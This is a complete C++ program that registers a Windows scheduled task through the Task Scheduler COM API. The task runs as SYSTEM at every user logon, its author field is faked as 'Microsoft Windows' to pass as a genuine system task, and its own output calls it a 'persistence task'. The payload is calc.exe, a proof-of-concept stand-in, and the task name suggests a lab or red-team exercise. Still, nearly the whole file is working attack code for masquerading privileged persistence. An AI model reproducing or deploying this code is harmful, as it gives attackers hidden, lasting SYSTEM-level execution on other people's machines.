#define _WIN32_DCOM
#include <windows.h>
#include <taskschd.h>
#include <iostream>
#include <comdef.h>

// Link with taskschd.lib
#pragma comment(lib, "taskschd.lib")

// Generate Smart Pointer wrappers for the COM interfaces
_COM_SMARTPTR_TYPEDEF(ITaskService, __uuidof(ITaskService));
_COM_SMARTPTR_TYPEDEF(ITaskFolder, __uuidof(ITaskFolder));
_COM_SMARTPTR_TYPEDEF(ITaskDefinition, __uuidof(ITaskDefinition));
_COM_SMARTPTR_TYPEDEF(IRegistrationInfo, __uuidof(IRegistrationInfo));
_COM_SMARTPTR_TYPEDEF(ITriggerCollection, __uuidof(ITriggerCollection));
_COM_SMARTPTR_TYPEDEF(ITrigger, __uuidof(ITrigger));
_COM_SMARTPTR_TYPEDEF(ILogonTrigger, __uuidof(ILogonTrigger));
_COM_SMARTPTR_TYPEDEF(IActionCollection, __uuidof(IActionCollection));
_COM_SMARTPTR_TYPEDEF(IAction, __uuidof(IAction));
_COM_SMARTPTR_TYPEDEF(IExecAction, __uuidof(IExecAction));
_COM_SMARTPTR_TYPEDEF(IRegisteredTask, __uuidof(IRegisteredTask));

int main()
{
    // 1. Initialize COM library and security
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        std::clog << "[-] CoInitializeEx failed: 0x" << std::hex << hr << std::endl;
        return 1;
    }

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
    if (FAILED(hr))
    {
        std::clog << "[-] CoInitializeSecurity failed: 0x" << std::hex << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    try
    {
        // 2. Create and connect to the Task Service instance
        ITaskServicePtr pService;
        hr = pService.CreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER);
        if (FAILED(hr))
            throw _com_error(hr);

        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr))
            throw _com_error(hr);

        // 3. Get the Root Task Folder
        ITaskFolderPtr pRootFolder;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr))
            throw _com_error(hr);

        // Clean up previous instances of this task
        pRootFolder->DeleteTask(_bstr_t(L"A06_3a_LogonTask"), 0);

        // 4. Create a new Task Definition
        ITaskDefinitionPtr pTask;
        hr = pService->NewTask(0, &pTask);
        if (FAILED(hr))
            throw _com_error(hr);

        // 5. Configure Task Registration Info
        IRegistrationInfoPtr pRegInfo;
        hr = pTask->get_RegistrationInfo(&pRegInfo);
        if (SUCCEEDED(hr))
        {
            pRegInfo->put_Author(_bstr_t(L"Microsoft Windows"));
        }

        // 6. Set up the Logon Trigger
        ITriggerCollectionPtr pTriggerCollection;
        hr = pTask->get_Triggers(&pTriggerCollection);
        if (FAILED(hr))
            throw _com_error(hr);

        ITriggerPtr pTrigger;
        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
        if (FAILED(hr))
            throw _com_error(hr);

        ILogonTriggerPtr pLogonTrigger = pTrigger; // Automatic QueryInterface via Smart Pointer
        if (pLogonTrigger == NULL)
        {
            throw _com_error(E_NOINTERFACE);
        }
        pLogonTrigger->put_Id(_bstr_t(L"LogonTriggerId"));

        // 7. Define the Action (What to execute)
        IActionCollectionPtr pActionCollection;
        hr = pTask->get_Actions(&pActionCollection);
        if (FAILED(hr))
            throw _com_error(hr);

        IActionPtr pAction;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (FAILED(hr))
            throw _com_error(hr);

        IExecActionPtr pExecAction = pAction; // Automatic QueryInterface
        if (pExecAction == NULL)
        {
            throw _com_error(E_NOINTERFACE);
        }

        // Define payload path (e.g., calc.exe)
        pExecAction->put_Path(_bstr_t(L"C:\\Windows\\System32\\calc.exe"));

        // 8. Register the Task
        IRegisteredTaskPtr pRegisteredTask;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(L"A06_3a_LogonTask"), // Task Name
            pTask,                        // Task Definition
            TASK_CREATE_OR_UPDATE,        // Flags
            _variant_t(L"SYSTEM"),        // Run as SYSTEM context
            _variant_t(),                 // No password needed for SYSTEM
            TASK_LOGON_SERVICE_ACCOUNT,   // Credentials type
            _variant_t(L""),              // SDDL parameters
            &pRegisteredTask);

        if (FAILED(hr))
            throw _com_error(hr);

        std::cout << "[+] Successfully registered C++ logon-triggered persistence task!" << std::endl;
    }
    catch (const _com_error &e)
    {
        std::clog << "[-] COM Error encountered: 0x" << std::hex << e.Error() << std::endl;
    }

    // All smart pointers (pService, pRootFolder, etc.) automatically release here as they go out of scope.
    CoUninitialize();
    return 0;
}